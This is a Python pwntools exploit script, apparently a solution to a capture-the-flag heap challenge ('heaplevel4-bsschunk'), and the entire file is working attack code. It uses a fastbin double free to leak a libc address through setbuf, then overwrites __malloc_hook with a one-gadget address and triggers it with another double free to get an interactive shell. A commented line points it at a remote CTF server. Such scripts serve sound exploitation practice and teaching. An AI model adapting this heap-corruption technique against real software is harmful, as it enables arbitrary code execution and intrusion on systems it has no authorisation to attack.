from pwn import *

context.log_level="debug"

def add(data):
    r.sendlineafter('>> ', '1')
    r.sendlineafter(': ', data)
def dele(idx):
    r.sendlineafter('>> ', '3')
    r.sendlineafter(':', str(idx))
def show(idx):
    r.sendlineafter('>> ', '2')
    r.sendlineafter(':', str(idx))
def exploit(r): 
    #libc.address = tmp - libc.sym['setbuf']
    #info('%016x libc.address', libc.address)
    add('aaa') # 0 
    add('bbb') # 1
    dele(0)
    dele(1)
    dele(0)
    err=0x6020a0
    add(p64(err-3))
    #add( p64(libc.sym['__malloc_hook']-19 ) )
    add('c'*8)
    add('c'*8)
    add('a'*19+p64(0x602030))
    show(0)
    setbuf=r.recv(6)
    
    setbuf_addr=hex(u64(setbuf+'\x00'+'\x00'))
    setbuf_p=libc.sym['setbuf']
    libc.address=int(setbuf_addr,16)-setbuf_p
    print libc.address

    add('aaa') # 0 
    add('bbb') # 1
    pause()
    dele(2)
    dele(3)
    dele(2)
    add( p64(libc.sym['__malloc_hook']-19 ) )
    add('c'*8)
    add('c'*8)
    add('\x7f\0\0' + p64(libc.address + 0xf02a4))
    dele(2)
    dele(2)

r=process("./heaplevel4-bsschunk")
#r=remote("pwn.sixstars.team",22504)
elf=ELF("./heaplevel4-bsschunk")
libc=ELF("./libc.so.6")
print r.pid
pause()
exploit(r)
r.interactive()

